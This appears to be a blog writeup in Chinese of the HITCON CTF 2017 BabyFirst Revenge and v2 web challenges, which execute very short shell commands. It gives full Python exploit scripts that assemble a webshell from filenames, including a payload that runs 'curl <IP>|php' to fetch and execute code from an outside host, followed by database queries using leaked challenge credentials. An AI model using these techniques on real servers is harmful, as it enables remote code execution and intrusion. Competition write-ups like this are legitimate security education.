---
comments: true
title: HITCON CTF 2017 BabyFirst Revenge and v2 writeup
date: 2017-11-12 17:14:27
description: 绕过四个字符限制getshell
---

> from HITCON CTF 2017
> 2017/11/04 02:00 UTC ~ 2017/11/06 02:00 UTC
>
> https://ctf2017.hitcon.org/

### BabyFirst Revenge

> Do you remember [BabyFirst](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst) from HITCON CTF 2015?
>
> This is the harder version!
>
> <http://52.199.204.34/>

#### 源码

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

#### 解法

详细说明：https://findneo.github.io/171110Bypass4CLimit/ 

拿到shell后在`/home/fl4444g/README.txt`  得到数据库配置信息，然后连接数据库得到flag。

```python
http://52.199.204.34/sandbox/___MD5___of___ip/shell.php?cmd=cat%20/home/fl4444g/README.txt
#    Flag is in the MySQL database
#fl4444g / SugZXUtgeJ52_Bvr

http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "show databases;"
#    Database
#information_schema
#fl4gdb

http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "select concat(table_name) from information_schema.tables where table_schema='fl4gdb';"
#    concat(table_name)
#this_is_the_fl4g

http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "use fl4gdb;select * from this_is_the_fl4g"
#    secret
#hitcon{idea_from_phith0n,thank_you:)}
```



![](getFlag.png)

#### EXP

```python
# by https://findneo.github.io/
import requests as r
import hashlib
url = 'http://52.199.204.34/'
# 查询自己的IP
ip = r.get('http://ipv4.icanhazip.com/').text.strip()
sandbox = url + 'sandbox/' + hashlib.md5('orange' + ip).hexdigest() + '/'

reset = url + '?reset'
cmd = url + '?cmd='
build = ['>cur\\',
         '>l\ \\',
         'ls>A',
         'rm c*',
         'rm l*',
         '>105\\',
         '>304\\',
         '>301\\',
         '>9\>\\',
         'ls>>A',
         'sh A',
         'php A'
         ]
# 如果目标服务器有GET，这个也是可以打的
# build = ['>GE\\',
#          '>T\\ \\',
#          'ls>A',
#          'rm G*',
#          'rm T*',
#          '>105\\',
#          '>304\\',
#          '>301\\',
#          '>9\>\\',
#          'ls>>A']
r.get(reset)
for i in build:
    s = r.get(cmd + i)
    print '[%s]' % s.status_code, s.url

s = r.get(sandbox + 'fun.php?cmd=uname -a')
print '\n' + '[%s]' % s.status_code, s.url
print s.text

```

#### 更多解答

https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge

### BabyFirst Revenge v2

> BabyFirst Revenge v2
> This is the hardest version! Short enough?
>
> http://52.197.41.31/

#### 源码

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

#### 解法

这题是赛后看wp复现的，只到拿webshell的部分。

详细说明： https://findneo.github.io/171110Bypass4CLimit/

#### EXP

```python
#-*-coding:utf8-*-
# by https://findneo.github.io/
import requests as r
from time import sleep
import random
import hashlib
target = 'http://52.197.41.31/'

# 存放待下载文件的公网主机的IP
shell_ip = 'xx.xx.xx.xx'

# 本机IP
your_ip = r.get('http://ipv4.icanhazip.com/').text.strip()

# 将shell_IP转换成十六进制
ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2))
                     for i in shell_ip.split('.')])

reset = target + '?reset'
cmd = target + '?cmd='
sandbox = target + 'sandbox/' + \
    hashlib.md5('orange' + your_ip).hexdigest() + '/'

# payload某些位置的可选字符
pos0 = random.choice('efgh')
pos1 = random.choice('hkpq')
pos2 = 'g'  # 随意选择字符

payload = [
    '>dir',
    # 创建名为 dir 的文件

    '>%s\>' % pos0,
    # 假设pos0选择 f , 创建名为 f> 的文件

    '>%st-' % pos1,
    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，
    # 因为alphabetical序中t>s

    '>sl',
    # 创建名为 >sl 的文件；到此处有四个文件，
    # ls 的结果会是：dir f> kt- sl

    '*>v',
    # * 相当于 `ls` ，那么这条命令等价于 `dir f> kt- sl`>v ，
    #  dir是不换行的，所以这时会创建文件 v 并写入 f> kt- sl
    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符

    '>rev',
    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f> kt- rev sl v

    '*v>%s' % pos2,
    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。
    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk > f

    # 续行分割 curl 0x11223344|php 并逆序写入
    '>p',
    '>ph\\',
    '>\|\\',
    '>%s\\' % ip[8:10],
    '>%s\\' % ip[6:8],
    '>%s\\' % ip[4:6],
    '>%s\\' % ip[2:4],
    '>%s\\' % ip[0:2],
    '>\ \\',
    '>rl\\',
    '>cu\\',

    'sh ' + pos2,
    # sh g ;g 的内容是 ls -tk > f ，那么就会把逆序的命令反转回来，
    # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行
    'sh ' + pos0,
    # sh f 执行curl命令，下载文件，写入木马。
]

s = r.get(reset)
for i in payload:
    assert len(i) <= 4
    s = r.get(cmd + i)
    print '[%d]' % s.status_code, s.url
    sleep(0.1)
s = r.get(sandbox + 'fun.php?cmd=uname -a')
print '[%d]' % s.status_code, s.url
print s.text

```

#### 更多解答

https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2

### 参考链接

[来自小密圈里的那些奇技淫巧](https://speakerdeck.com/player/f81159300925466c88335f3cf740beb6) 